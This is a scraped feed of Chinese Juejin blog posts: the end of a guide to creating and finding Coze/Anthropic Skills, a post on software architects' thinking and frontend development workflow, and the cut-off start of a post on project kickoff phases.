<p><strong>4、Skills和智能体：</strong> 智能体是有自主能力、会思考如何执行的机器人，而Skills则像是机器人眼睛上的摄像头，可以让机器人知道应该如何打开它。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/871c53d5a2384596b4f192b7cb6a413b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=BHwdRQplLcLzbMUjigSXutrxwX0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">Coze Skills如何？</h2>
<p>Coze中的技能其实就是follow了Anthropic推出来的这套规范，要了解Coze Skills如何制作的，可以更多的去好好的了解Anthropic官方的这套规范即可，按照包里面的内容基本都遵守。</p>
<p>Coze走的比较前的是，它把Anthropic给产品化了，这让原本只能在Claude侧才能玩转的Skills直接让人们在它的产品页面上点点点、问问问就可以生成一个专属的Skills。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e85fccbbc47402f89f577276db0936f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=hlA0Ui4xc7vS3mW10OTLlk%2B6axU%3D" alt="" loading="lazy"/></p>
<p>Coze上的Skills有两种，第一种就是你可以直接在技能框中输入你的需求，通过自然语言的方式来创建一个技能。</p>
<p>比如，“我想创建一个[功能名称]的 Skill，用于[解决什么问题]，当用户[触发场景]时使用，输出[期望格式和内容]。”，就是套用这样的一个提示词模板，就可以让扣子编程给你生成一个技能。</p>
<p>第二种生成技能的方式，就是上传技能包的方式，就是按照文章开头部分给大家介绍的Skills的规范打包好Skills，然后直接上传，就可以得到一个你的技能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/726349a750c0452e94fca4f43cdc3b8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=T6TAGWptnHp40ziJOSrpN9H%2Fcyc%3D" alt="" loading="lazy"/></p>
<p>生成好你的技能，紧接着就是部署发布了，这个和我之前发过的使用扣子编程的流程一致，这部分流程不懂的可以看看之前文章参考——《无代码时代真来了？扣子（Coze）一句话生成工作流》。</p>
<p>当你做好了一个技能之后，可以怎么样去使用这个技能？只需要在对话框中直接@你的技能，给它提供信息即可。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/934b21d4d2534c6685c18af225182fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=av2F8NIWMs4wRq1A%2FJAwc2hd17w%3D" alt="" loading="lazy"/></p>
<p>Coze之所以吸引了这么多人到上面开发Skills，主要是因为它的技能商店，就是你把你的擅长的某一个行业的专业知识封装成一个技能之后，你可以直接把你的技能上架到节能商店，上架到技能商店之后，别人可以直接使用你的技能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79ab68e21ec44bccba5f31dbb9988caa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=1U%2F2Bvj3e4fcB9BYWr%2BRluQAny0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">去哪找好用的Skills？</h2>
<p>正所谓授人以鱼不如授人以渔，对于我们大部分想提高效率的人，那当然是拿来主义，使用现成的技能才是最爽的。</p>
<p>第一种方法，就是到Coze的官方技能商店上面去找，看到合适的技能，把它添加到你自己的技能中即可。</p>
<p>第二种方法，是从其他的网站上面去找，下面分享一些找能到现成Skill的一些网站。</p>
<p>1、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer">github.com/anthropics/…</a> 这个是Anthropic的官方skills，干净，规范，想学习如何制作skills的可以从这个入手，不好的地方就是数量不多。</p>
<p>2、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FComposioHQ%2Fawesome-claude-skills" target="_blank" title="https://github.com/ComposioHQ/awesome-claude-skills" ref="nofollow noopener noreferrer">github.com/ComposioHQ/…</a> 分类很清晰，但是更新频率不高，平常也可以逛逛。</p>
<p>3、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftravisvn%2Fawesome-claude-skills" target="_blank" title="https://github.com/travisvn/awesome-claude-skills" ref="nofollow noopener noreferrer">github.com/travisvn/aw…</a> 这个是由社区成员Travis维护的一个技能列表，数量和质量都很不错，想看看有没有什么黑科技的可以逛逛。</p>
<p>4、<a href="https://link.juejin.cn?target=http%3A%2F%2Fskillsmp.com" target="_blank" title="http://skillsmp.com" ref="nofollow noopener noreferrer">skillsmp.com</a> 这个目前skills的体量最大，通过爬虫收集，更新频率杠杠滴，但是质量参差不齐，想要找灵感的可以多逛逛。</p>
<p>5、<a href="https://link.juejin.cn?target=http%3A%2F%2Fskills.sh" target="_blank" title="http://skills.sh" ref="nofollow noopener noreferrer">skills.sh</a> 这个是官方合作的高质量的前段和部署方向的可以看看。</p>
<h2 data-id="heading-4">总结</h2>
<p>Skills是一个很新的技术概念，但是能爆火肯定是有它的优点，比如消耗的token更少，能更好的扩展，但是这个玩意对模型的要求是比较高的，模型推理能力不强的话，很可能会找马得驴。</p>
<p>本文的分享就到这里，如果您觉得有收获的话，可以给个一键三连，您的鼓励是吾鳴持续输出的最大动力。有什么疑问也可以打在评论区，吾鳴会第一时间回复。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bcb5c1e75d04e249af2ec0bd5fc2b25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=eFwZgQ1OqlSRID43LjmHUMROqYU%3D" alt="" loading="lazy"/></p>
<p>最近实战了一些扣子（Coze）工作流相关的案例，包含小红薯图文生成、爆款视频剪辑、办公提效等扣子案例，内附详细的教程和工作流安装包，感兴趣的朋友可以来个<strong>一键三连（必须动作）</strong> ，文章评论区评论“<strong>扣子案例</strong>”领取。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🧠 架构师的思维与开发准则]]></title>    <link>https://juejin.cn/post/7602259669730361371</link>    <guid>https://juejin.cn/post/7602259669730361371</guid>    <pubDate>2026-02-03T03:53:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730361371" data-draft-id="7602259669730344987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🧠 架构师的思维与开发准则"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T03:53:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🧠 架构师的思维与开发准则
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:53:37.000Z" title="Tue Feb 03 2026 03:53:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、脑力与思考习惯</h2>
<blockquote>
<p>行万里路，不如脑子想清楚。<br/>
回答要准确，要有预案、预估，让领导感受清楚。</p>
</blockquote>
<p>在开发与架构工作中，“脑力”并非只是技术熟练度，而是<strong>系统性思考</strong>的体现。面对复杂业务时，关键在于：</p>
<ul>
<li><strong>想清楚路径</strong>：在动手前理清问题边界与预期结果。</li>
<li><strong>提前做预案</strong>：为可能的变化、失败做准备。</li>
<li><strong>结果要传达清晰</strong>：让管理者与合作方听得懂、感受到“确定性”。</li>
</ul>
<p>好的工程师，不只是代码工人，而是能“带脑子上流水线”的人。</p>
<hr/>
<h2 data-id="heading-1">二、代入角色与把握度</h2>
<p>不同角色对应不同视角：</p>
<ul>
<li>🧩 <strong>开发者视角</strong>：关心任务拆解与实现效率。</li>
<li>🧱 <strong>架构师视角</strong>：关心结构可复用、扩展性与流转逻辑。</li>
<li>🚀 <strong>领导视角</strong>：希望看到清晰的目标、节奏与产出。</li>
</ul>
<p><strong>“把握度”就是在不同角色中切换思维的能力。</strong><br/>
懂得在细节与全局间来回切换，是从“熟练工”到“设计者”的关键一步。</p>
<hr/>
<h2 data-id="heading-2">三、架构师的高度：决定于胸怀与目标</h2>
<blockquote>
<p>心胸和目标决定架构师的高度。<br/>
基础组件是为了快速出成果，而核心是对业务的理解与流转。</p>
</blockquote>
<p>一个优秀的架构师必须在“效率”与“理解”之间找到平衡点：</p>
<ul>
<li><strong>基础组件</strong>：标准化输出，快速落地。</li>
<li><strong>业务理解</strong>：深入思考业务本质，找到真正可复用的逻辑单元。</li>
<li><strong>流转与思考模型</strong>：让代码、需求、产品在流转中保持一致性。</li>
</ul>
<p>架构从不是“高大上”的工程，而是一种<strong>持续理解业务、抽象共性</strong>的过程。</p>
<hr/>
<h2 data-id="heading-3">四、开发执行准则（Dev Roadmap）</h2>
<blockquote>
<p>从确定性出发，到高质量交付。</p>
</blockquote>























































<table><thead><tr><th align="left">阶段</th><th align="left">内容</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">a</td><td align="left">✅ 梳理确定性的需求</td><td align="left">识别信息不对称点，避免浪费</td></tr><tr><td align="left">b</td><td align="left">🧱 基础前端静态页面</td><td align="left">确定页面结构与初步样式</td></tr><tr><td align="left">c</td><td align="left">📦 前端基础数据结构</td><td align="left">定义核心 store 与命名规范</td></tr><tr><td align="left">d</td><td align="left">⚙️ 扩展业务数据结构</td><td align="left">适配真实业务流转</td></tr><tr><td align="left">e</td><td align="left">🔄 mock 数据</td><td align="left">模拟真实请求和交互</td></tr><tr><td align="left">f</td><td align="left">🎨 优化后的视图</td><td align="left">界面视觉优化与结构调整</td></tr><tr><td align="left">g</td><td align="left">🧩 完善交互</td><td align="left">骨架屏、逻辑交互——拒绝无效开发</td></tr><tr><td align="left">h</td><td align="left">🔗 对接真实 API</td><td align="left">核心字段名要与后端保持一致</td></tr><tr><td align="left">i</td><td align="left">🧪 自测收尾</td><td align="left">自动化或半自动化验证流程</td></tr></tbody></table>
<p>📌 <strong>原则</strong>：能跑的最小闭环版本 &gt; 空洞的“全功能计划”。<br/>
我们只做助推业务节奏的功能，不在边角功能迷失方向。</p>
<hr/>
<h2 data-id="heading-4">五、积累与沉淀</h2>
<ul>
<li>
<p><strong>日常积累模板</strong>：</p>
<ul>
<li>🗂 OA 系统模板：<code>oa-start-template</code></li>
<li>🛠 机器设备模板：<code>machine-start-template</code></li>
</ul>
</li>
<li>
<p><strong>学习路径</strong>：</p>
<ul>
<li>研究优秀作者推荐的框架或源码；</li>
<li>模仿优秀项目的组织结构；</li>
<li>累积可迁移的模式（Store、Route、Hook、Component）。</li>
</ul>
</li>
</ul>
<p>经验不在项目数量，而在你能否“提炼出下一个模板”。</p>
<hr/>
<h2 data-id="heading-5">六、Store：远不止全局状态</h2>
<blockquote>
<p>“一个 store 的意义，远远大于全局状态这个概念。”</p>
</blockquote>
<p>Store 连接着数据流、逻辑流与业务流，它的核心价值在于：</p>
<ul>
<li><strong>结构性</strong>：清晰的数据来源与归宿。</li>
<li><strong>灵活性</strong>：可应对多场景轻量分支逻辑。</li>
<li><strong>可扩展性</strong>：天然具备模块化接入能力。</li>
</ul>
<p>进一步，<strong>命名体系</strong>（文件命名、路由命名）也是隐形的架构力。<br/>
良好的命名习惯能决定一个项目的维护成本与生命周期。</p>
<hr/>
<h2 data-id="heading-6">七、设计与视觉：架构主题的美学表达</h2>
<p>系统风格不只是配色与样式，而是<strong>架构理念的视觉延伸</strong>。<br/>
建议根据团队主题色统一系统 UI 风格，与大厂体验对齐：</p>
<ul>
<li>
<p>🎨 对标风格：<strong>X / Google / GitHub</strong></p>
</li>
<li>
<p>✨ 实践方向：</p>
<ul>
<li>使用浅调主色 + 中性色背景；</li>
<li>保留呼吸空间与层级关系；</li>
<li>引入统一的阴影、圆角及状态反馈；</li>
<li>增强细节交互体验（hover、skeleton、loading）。</li>
</ul>
</li>
</ul>
<p>视觉的一致性，是专业感的第一印象。<br/>
页面之“美”，是架构理念的延伸。</p>
<hr/>
<h2 data-id="heading-7">🧭 结语</h2>
<blockquote>
<p>架构不是设计图，而是一种“思考的方式”。<br/>
思考清楚，比走得快更重要；<br/>
结构清晰，比功能多更持久。</p>
</blockquote>
<p>架构师应像导演，既掌控节奏，又理解每个角色的意义。<br/>
如此，团队才能在一条清晰的线上——<strong>聪明地前进</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[项目启动三阶段：从思到形]]></title>    <link>https://juejin.cn/post/7602303923140247602</link>    <guid>https://juejin.cn/post/7602303923140247602</guid>    <pubDate>2026-02-03T03:55:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923140247602" data-draft-id="7602252722373017651" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="项目启动三阶段：从思到形"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T03:55:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            项目启动三阶段：从思到形
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:55:24.000Z" title="Tue Feb 03 2026 03:55:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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